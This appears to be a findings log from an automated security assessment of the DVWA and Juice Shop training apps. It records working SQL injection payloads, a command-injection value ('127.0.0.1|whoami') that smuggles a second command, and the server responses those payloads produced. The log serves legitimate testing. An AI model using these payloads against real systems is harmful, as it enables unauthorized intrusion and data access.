findings.title: Product-Search SQL Injection (q parameter) - SQLite error and UNION injection

GET /rest/products/search?q=qwert' (unauth) -> 500, body: 'Error: SQLITE_ERROR: near "'%'": syntax error'

findings.title: Unauthenticated User-Feedback listing - email PII only partially masked

findings.response_evidence: Unauthenticated GET /api/Feedbacks returns 200 with 8 feedback records (fields: UserId, id, comment, rating, createdAt, updatedAt) with no authentication required, so the unauthenticated-access part holds. However, author email addresses are NOT fully disclosed: every comment that carries an author email is masked, e.g. '(***in@juice-sh.op)', '(***@juice-sh.op)', '(***der@juice-sh.op)', '(***ereum@juice-sh.op)'; anonymous entries show '(anonymous)' with UserId null. No full email address appears in the response. Masked fragments only leak partial local-part characters and domain, which does not meet the 'discloses author email addresses' criterion. Verdict inconclusive pending the Coordinator's decision on whether partial-masked PII counts as disclosure (CWE-359 unauthenticated access to user-linked feedback is confirmed; full email PII is not).

findings.title: [security=low] SQL injection via session-input.php: stored id is not consumed by low-level /vulnerabilities/sqli/ query
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php (dvwa_admin, security=low) form id=1' OR '1'='1' #&Submit=Submit -> 200, echoes 'Session ID: 1' OR '1'='1' #'
GET http://dvwa/vulnerabilities/sqli/ (dvwa_admin) -> 200, 'User ID:' empty, zero user records
Comparison: GET http://dvwa/vulnerabilities/sqli/?id=1' OR '1'='1' #&Submit=Submit (dvwa_admin, security=low) -> 200, 5 records
findings.response_evidence: [security=low] Session-input path: POST stored the TRUE payload (echoed 'Session ID: 1' OR '1'='1' #'), but the subsequent GET /vulnerabilities/sqli/ returned no user records (User ID field empty, no surnames). The low-level query page does not read the session-stored id, so this sink is not reached at low. The FALSE-payload comparison was not run because the session path produced no records to compare. Note: the same TRUE payload sent directly as the GET id parameter to /vulnerabilities/sqli/ returned 5 records (surnames admin/Brown/Me/Picasso/Smith), which is a separate, already-known injection on the GET endpoint, not this session-input endpoint. Verdict for session-input.php: no SQLi observed through this endpoint at low.

findings.title: Unauthenticated feedback listing exposes partially masked author emails on GET /api/Feedbacks
findings.response_evidence: HTTP 200 unauthenticated, 8 records. Author emails appear only inside comment text, masked: {"UserId":1,"id":1,"comment":"I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)"}; {"UserId":2,"id":2,"comment":"Great shop! Awesome service! (***@juice-sh.op)"}; {"UserId":3,"id":3,"comment":"Nothing useful available here! (***der@juice-sh.op)"}; {"UserId":21,"id":4,"comment":"... (***ereum@juice-sh.op)"}; remaining 4 entries have UserId null and comment suffix (anonymous). Verdict reasoning: no full email address is disclosed in cleartext. The masking hides the local part except for trailing fragments (e.g. 'in', 'der', 'ereum'), which are not reversible to a full address on their own, but the UserId is exposed alongside them. Because the disclosure is partial and not a full address, CWE-359 is not conclusively proven; coordinator should decide whether trailing-fragment leakage counts as identifying PII.

findings.title: [security=high] SQL Injection via session-stored id (session-input.php -> /vulnerabilities/sqli/)
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> page reads 'Security level is currently: high'; user_token=[REDACTED]
POST http://dvwa/vulnerabilities/sqli/session-input.php form id=1' OR '1'='1' #&Submit=Submit (dvwa_admin) -> 'Session ID: 1' OR '1'='1' #'
POST http://dvwa/vulnerabilities/sqli/session-input.php form id=1' AND '1'='2' #&Submit=Submit (dvwa_admin) -> 'Session ID: 1' AND '1'='2' #'
findings.response_evidence: [security=high] TRUE payload 1' OR '1'='1' # on GET /vulnerabilities/sqli/ returned 5 records (HTTP 200): 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE control 1' AND '1'='2' # on the same page returned zero ID rows (only 'Click here to change your ID' and footer; no 'ID:' / 'Surname:' lines). Difference is behavioral: TRUE yields multiple seeded surnames, FALSE yields none, so the id is injected into the SQL in a boolean-controllable way via the session value. Note: the security.php page at the start of this run stated 'Security level is currently: high', but the tool's session_info field reported 'low' on every response; the page content is taken as the authoritative level for this annotation. Trailing-comment form worked; no UNION needed.

findings.title: OS Command Injection via ping 'ip' parameter [security=high] - pipe without trailing space bypass
findings.response_evidence: [security=high] HTTP 200 from POST /vulnerabilities/exec/ with ip=127.0.0.1|whoami. Response body contains the ping section followed by the bare line 'www-data' (command output), and 'Security level set to high' / 'Security Level: high' in the page. Payload used: pipe with no trailing space, no ';' or '&&'. Note: the tool's session_info still reported security_level 'low' after the 302 response, but the page body itself shows high, so the server-side level is high. Confirmation based on www-data in output, per criteria.

findings.title: DVWA security-level change endpoint (POST /security.php): state change accepted with valid user_token; CSRF protection not verified
request_sequence: GET http://dvwa/security.php (dvwa_admin) -> 200, page shows 'Security level is currently: high', user_token=[REDACTED]
GET http://dvwa/security.php (dvwa_admin) -> 200, page shows 'Security level is currently: medium' and 'Security level set to medium'; new user_token=[REDACTED]
findings.response_evidence: [security=medium] The level-change POST with a valid, page-issued user_token returned 302 and the follow-up GET reads 'Security level is currently: medium . ... Security level set to medium'. The state change is persistent and verified. Discrepancy: the pre-write GET showed the level as 'high', not 'medium' as in the candidate record, so the level was changed by someone else between observations. The tool's session_info.security_level field lagged and reported 'low' on all three responses, so it is not authoritative. CWE-352 is NOT verified: no token-less or cross-origin POST was tested, to stay within the 1-2 write budget, so the anti-CSRF control is unconfirmed. Current DVWA level: medium. Notes on other items (not re-tested per assignment): DVWA session-input SQLi and Juice Shop /api/Feedbacks remain inconclusive.

state.halt_reason: Assessment is essentially complete. Both targets have been mapped and nearly all high-priority candidates are verified: DVWA SQLi, command injection, and stored XSS are confirmed at low, medium, and high levels where applicable.
